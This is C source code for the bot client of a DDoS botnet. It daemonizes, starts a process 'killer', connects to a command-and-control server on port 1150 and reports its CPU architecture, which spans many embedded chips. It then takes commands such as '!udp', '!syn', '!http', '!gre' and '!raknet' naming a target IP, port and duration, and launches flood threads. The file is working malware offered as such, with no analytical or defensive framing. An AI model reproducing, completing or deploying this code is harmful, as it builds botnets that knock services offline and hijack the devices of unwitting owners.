#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include "headers/syn_attack.h"
#include "headers/udp_attack.h"
#include "headers/http_attack.h"
#include "headers/socket_attack.h"
#include "headers/vse_attack.h"
#include "headers/raknet_attack.h"
#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/icmp_attack.h"
#include "headers/killer.h"
#include "headers/gre_attack.h"
#include "headers/connection_lock.h"
#include "headers/udpplain_attack.h"

#define CNC_IP "0.0.0.0"
#define BOT_PORT 1150
#define MAX_THREADS 15
#define RETRY_DELAY 2
#define RECV_TIMEOUT_MS 12000
#define MAX_RETRIES 30
#define CONNECTION_TIMEOUT 3
#define PING_INTERVAL 4
#define FAST_RETRY_COUNT 5
#define FAST_RETRY_DELAY 1

typedef struct {
    pthread_t thread;
    void* params;
    int active;
    int type;  
} attack_thread_state;

static attack_thread_state thread_states[MAX_THREADS];
pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

const char* get_arch() {
    #ifdef ARCH_aarch64
    return "aarch64";
    #elif defined(ARCH_arm)
    return "arm";
    #elif defined(ARCH_armhf)
    return "armhf";
    #elif defined(ARCH_mips)
    return "mips";
    #elif defined(ARCH_mipsel)
    return "mipsel";
    #elif defined(ARCH_powerpc64)
    return "powerpc64";
    #elif defined(ARCH_sparc)
    return "sparc";
    #elif defined(ARCH_m68k)
    return "m68k";
    #elif defined(ARCH_i686)
    return "i686";
    #elif defined(ARCH_x86_64)
    return "x86_64";
    #elif defined(ARCH_sh4)
    return "sh4";
    #elif defined(ARCH_arc)
    return "arc700";
    #else
    return "unknown";
    #endif
}

static void init_thread_states() {
    memset(thread_states, 0, sizeof(thread_states));
    for (int i = 0; i < MAX_THREADS; i++) {
        thread_states[i].thread = 0;
        thread_states[i].params = NULL;
        thread_states[i].active = 0;
        thread_states[i].type = -1;
    }
}

void cleanup_attack_threads() {
    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (thread_states[i].thread != 0) {
            if (thread_states[i].params) {
                if (thread_states[i].type == 0) {
                    ((attack_params*)thread_states[i].params)->active = 0;
                } else if (thread_states[i].type == 1) {
                    ((gre_attack_params*)thread_states[i].params)->active = 0;
                }
            }
            
            pthread_join(thread_states[i].thread, NULL);
            
            if (thread_states[i].params) {
                free(thread_states[i].params);
            }
            
            thread_states[i].thread = 0;
            thread_states[i].params = NULL;
            thread_states[i].active = 0;
            thread_states[i].type = -1;
        }
    }
    pthread_mutex_unlock(&thread_mutex);
}

static attack_params* create_attack_params(const char *ip, uint16_t port, int duration, int psize, int srcport) {
    attack_params* params = calloc(1, sizeof(attack_params));
    if (!params) return NULL;

    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
        free(params);
        return NULL;
    }
    
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->active = 1;
    
    return params;
}

static gre_attack_params* create_gre_params(const char *ip, int duration, int psize, int srcport, int gre_proto, int gport) {
    gre_attack_params* params = calloc(1, sizeof(gre_attack_params));
    if (!params) return NULL;
    
    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(gport);
    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
        free(params);
        return NULL;
    }
    
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->gre_proto = gre_proto;
    params->gport = gport;
    params->active = 1;
    
    return params;
}

void handle_command(char* command, int sock) {
    if (!command || strlen(command) > 1023) return;
    
    static char buffer[256];
    if (strncmp(command, "ping", 4) == 0) {
        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        return;
    }
    
    static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre", "!udpplain"};
    static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4, 8};
    static void* (*attack_funcs[])(void*) = {
        udp_attack, vse_attack, syn_attack, socket_attack, 
        http_attack, raknet_attack, icmp_attack, gre_attack, udpplain_attack
    };
    
    if (strcmp(command, "stop") == 0) {
        cleanup_attack_threads();
        return;
    }

    int which = -1;
    for (int i = 0; i < 9; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            which = i;
            break;
        }
    }
    
    if (which >= 0) {
        static char ip[32];
        static char argstr[512];
        int n = 0;
        int port = 0;
        int time = 0;
        int psize = 0;
        int srcport = 0;
        int gre_proto = 0;
        int gport = 0;
        memset(ip, 0, sizeof(ip));
        memset(argstr, 0, sizeof(argstr));
        
        if (which == 6 || which == 7) {
            n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else {
            n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        }
        
        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) psize = atoi(token + 6);
                else if (strncmp(token, "srcport=", 8) == 0) srcport = atoi(token + 8);
                else if (strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                }
                else if (strncmp(token, "gport=", 6) == 0) gport = atoi(token + 6);
                token = strtok(NULL, " ");
            }
        }
        
        cleanup_attack_threads();
        
        pthread_mutex_lock(&thread_mutex);
        if (which == 7) {  // GRE attack
            gre_attack_params* params = create_gre_params(ip, time, psize, srcport, gre_proto, gport);
            if (!params) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            
            int ret = pthread_create(&thread_states[0].thread, NULL, gre_attack, params);
            if (ret != 0) {
                free(params);
            } else {
                thread_states[0].params = params;
                thread_states[0].active = 1;
                thread_states[0].type = 1;
            }
        } else {  
            attack_params* params = create_attack_params(ip, port, time, psize, srcport);
            if (!params) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            
            int ret = pthread_create(&thread_states[0].thread, NULL, attack_funcs[which], params);
            if (ret != 0) {
                free(params);
            } else {
                thread_states[0].params = params;
                thread_states[0].active = 1;
                thread_states[0].type = 0;
            }
        }
        pthread_mutex_unlock(&thread_mutex);
    }
}

int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
    int res;
    long arg;
    fd_set myset;
    struct timeval tv;
    int valopt;
    socklen_t lon;

    arg = fcntl(sock, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(sock, F_SETFL, arg);

    res = connect(sock, addr, addrlen);
    if (res < 0) {
       if (errno == EINPROGRESS) {
          tv.tv_sec = timeout_sec;
          tv.tv_usec = 0;
          FD_ZERO(&myset);
          FD_SET(sock, &myset);
          res = select(sock+1, NULL, &myset, NULL, &tv);
          if (res > 0) {
             lon = sizeof(int);
             getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
             if (valopt) {
                return -1;
             }
          }
          else {
             return -1;
          }
       }
       else {
          return -1;
       }
    }

    arg = fcntl(sock, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(sock, F_SETFL, arg);

    return 0;
}

int main(int argc __attribute__((unused)), char** argv __attribute__((unused))) {
    init_thread_states();
    
    static int sock = -1;
    static struct sockaddr_in server_addr;
    static char command[1024];
    ssize_t n;
    int lock_fd;

    daemonize(argc, argv);
    start_killer();
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) != 1) {
        return 1;
    }

    int reconnect_attempts = 0;
    time_t last_ping = 0;

    lock_fd = acquire_connection_lock();
    if (lock_fd < 0) {
        return 0;
    }

    while (1) {
        if (sock != -1) {
            close(sock);
            sock = -1;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            if (++reconnect_attempts >= MAX_RETRIES) {
                sleep(10);
                reconnect_attempts = 0;
            } else {
                sleep(RETRY_DELAY * reconnect_attempts);
            }
            continue;
        }

        int optval = 1;
        struct timeval timeout;
        timeout.tv_sec = 30;
        timeout.tv_usec = 0;

        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
        }
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        }
        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) {
        }
        if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        }

        #ifdef TCP_KEEPIDLE
        int keepidle = 30;
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
        #endif

        #ifdef TCP_KEEPINTVL
        int keepintvl = 5;
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
        #endif

        #ifdef TCP_KEEPCNT
        int keepcnt = 5;
        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
        #endif

        #ifdef TCP_SYNCNT
        int tcp_retries = 10;
        setsockopt(sock, IPPROTO_TCP, TCP_SYNCNT, &tcp_retries, sizeof(tcp_retries));
        #endif

        #ifdef TCP_MAXSEG
        int mss = 1448;
        setsockopt(sock, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
        #endif

        #ifdef TCP_NODELAY
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
        #endif
        
        int sndbuf = 65535;
        int rcvbuf = 65535;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

        int connected = 0;
        for (int timeout = 1; timeout <= CONNECTION_TIMEOUT && !connected; timeout++) {
            if (connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), timeout) == 0) {
                connected = 1;
                break;
            }
        }

        if (!connected) {
            close(sock);
            sock = -1;
            if (reconnect_attempts < FAST_RETRY_COUNT) {
                sleep(FAST_RETRY_DELAY);
                reconnect_attempts++;
            }
            else if (reconnect_attempts < MAX_RETRIES) {
                int delay = RETRY_DELAY * ((reconnect_attempts - FAST_RETRY_COUNT) / 5 + 1);
                if (delay > 30) delay = 30;
                sleep(delay);
                reconnect_attempts++;
            } 
            else {
                sleep(30);
                reconnect_attempts = 0;
            }
            continue;
        }

        if (send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL) <= 0) {
            close(sock);
            sock = -1;
            continue;
        }

        reconnect_attempts = 0;
        last_ping = time(NULL);

        while (1) {
            struct pollfd fds;
            fds.fd = sock;
            fds.events = POLLIN;
            time_t now = time(NULL);
            if (now - last_ping >= PING_INTERVAL) {
                if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
                    break;
                }
                last_ping = now;
            }
            int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
            if (poll_timeout < 0) poll_timeout = 0;
            int ret = poll(&fds, 1, poll_timeout);
            if (ret < 0 && errno != EINTR) {
                break;
            }
            if (ret > 0) {
                if (fds.revents & POLLIN) {
                    n = recv(sock, command, sizeof(command)-1, 0);
                    if (n <= 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            break;
                        }
                        continue;
                    }
                    command[n] = 0;
                    handle_command(command, sock);
                    memset(command, 0, sizeof(command));
                }
                if (fds.revents & (POLLERR | POLLHUP)) {
                    break;
                }
            }
        }
        
        if (sock != -1) {
            shutdown(sock, SHUT_RDWR);
            close(sock);
            sock = -1;
        }
        sleep(RETRY_DELAY);
    }

    release_connection_lock(lock_fd);
    return 0;
}
